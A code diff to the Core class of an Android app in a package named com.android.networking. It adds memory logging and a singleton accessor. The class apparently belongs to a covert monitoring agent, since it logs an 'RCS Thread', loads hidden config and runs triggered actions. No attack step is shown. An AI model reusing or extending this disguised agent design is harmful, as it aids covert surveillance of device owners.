@@ -7,11 +7,19 @@
 
 package com.android.networking;
 
+import java.util.Collection;
+import java.util.List;
+import java.util.Map;
+import java.util.TreeMap;
+
 import android.app.Activity;
+import android.app.ActivityManager;
+import android.app.ActivityManager.RunningAppProcessInfo;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.res.Resources;
+import android.os.Debug.MemoryInfo;
 import android.os.PowerManager;
 import android.os.PowerManager.WakeLock;
 
@@ -43,9 +51,6 @@ public class Core extends Activity implements Runnable {
 	/** The b stop core. */
 	private boolean bStopCore = false;
 
-	/** The resources. */
-	private Resources resources;
-
 	/** The core thread. */
 	private Thread coreThread = null;
 
@@ -65,7 +70,17 @@ public class Core extends Activity implements Runnable {
 
 	@SuppressWarnings("unused")
 	private void Core() {
+
+	}
+
+	static Core singleton;
+
+	public synchronized static Core self() {
+		if (singleton == null) {
+			singleton = new Core();
+		}
 	
+		return singleton;
 	}
 
 	/**
@@ -78,7 +93,7 @@ public class Core extends Activity implements Runnable {
 	 * @return true, if successful
 	 */
 
-	public boolean Start(final Resources r, final ContentResolver cr) {
+	public boolean Start(final Resources resources, final ContentResolver cr) {
 		if (serviceRunning == true) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
@@ -88,12 +103,10 @@ public class Core extends Activity implements Runnable {
 		}
 
 		coreThread = new Thread(this);
-		
 
 		moduleManager = ManagerModule.self();
 		eventManager = ManagerEvent.self();
-
-		resources = r;
+		
 		contentResolver = cr;
 		if (Cfg.DEBUG) {
 			coreThread.setName(getClass().getSimpleName());
@@ -157,13 +170,12 @@ public class Core extends Activity implements Runnable {
 	public void run() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
-			//startTrace();
+			// startTrace();
 		}
-		
+
 		if (Cfg.DEMO) {
 			Beep.beepPenta();
 		}
-
 
 		try {
 			if (Cfg.DEBUG) {
@@ -211,8 +223,6 @@ public class Core extends Activity implements Runnable {
 		}
 	}
 
-
-
 	private synchronized boolean checkActions() {
 
 		checkActionFast = new CheckAction(Action.FAST_QUEUE);
@@ -250,6 +260,11 @@ public class Core extends Activity implements Runnable {
 			while (!bStopCore) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
+
+				}
+
+				if (Cfg.MEMOSTAT) {
+					logMemory();
 				}
 
 				final Trigger[] actionIds = status.getTriggeredActions(qq);
@@ -259,7 +274,7 @@ public class Core extends Activity implements Runnable {
 						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
 					}
 				}
-				
+
 				if (Cfg.DEMO) {
 					Beep.beepPenta();
 				}
@@ -448,7 +463,7 @@ public class Core extends Activity implements Runnable {
 		int ret = ConfType.Error;
 
 		if (Cfg.DEMO) {
-			//Beep.beep();
+			// Beep.beep();
 		}
 
 		if (Cfg.DEBUG) {
@@ -494,7 +509,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (loadConf): TRY JSONCONF");
 			}
-			
+
 			final byte[] resource = Utils.getAsset("c.bin"); // config.bin
 			String json = new String(resource);
 			// Initialize the configuration object
@@ -652,14 +667,27 @@ public class Core extends Activity implements Runnable {
 		return exit;
 	}
 
-	static Core instance;
+	public static void logMemory() {
+		Status.self();
+		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
+		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
+		activityManager.getMemoryInfo(memoryInfo);
 
-	public synchronized static Core getInstance() {
-		if (instance == null) {
-			instance = new Core();
+		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem , true);
+		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory , true);
+		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold , true);
+
+		int pid = android.os.Process.myPid();
+		int pids[] = new int[] { pid };
+
+		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
+		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
+			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty() ,
+					true);
+			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss() , true);
+			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty() , true);
 		}
 
-		return instance;
 	}
 
 	public synchronized boolean reloadConf() {
